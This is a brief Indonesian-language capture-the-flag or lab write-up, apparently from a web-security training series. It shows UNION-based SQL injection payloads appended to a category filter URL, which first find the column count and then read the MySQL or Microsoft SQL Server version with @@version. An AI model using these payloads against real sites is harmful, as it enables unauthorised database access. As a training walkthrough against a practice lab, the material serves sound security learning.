# SQL injection attack, querying the database type and version on MySQL and Microsoft

<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

bagian sebelumnya kita sudah bisa melihat versi database oracle.

pada lba ini, kita akan coba exploitasi SQL Injection untuk melihat versi database untum MySQL dan Microsoft.

caranya mirip seperti sebelumnya, pilih salah satu category kemudian tentukan jumlah kolom terlebih dahulu dengan payload berikut di akhir URL: `/filter?category=Pets'+UNION+SELECT+'a'--+` .

jika responnya error, tambahkan kolom 1 lagi.

`/filter?category=Pets'+UNION+SELECT+'a','b'--+`&#x20;

<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

respon halaman seperti di atas berarti payload yang kita masukkan sudah memenuhi kondisi jumlah kolom, yaitu 2.

modifikasi payload untuk mendapatkan versi database: `/filter?category=Pets'+UNION+SELECT+@@version,+NULL--+`&#x20;

<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

di bagian paling bawah sudah berhasil menampilkan versi dari database.

<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption><p>solved!</p></figcaption></figure>
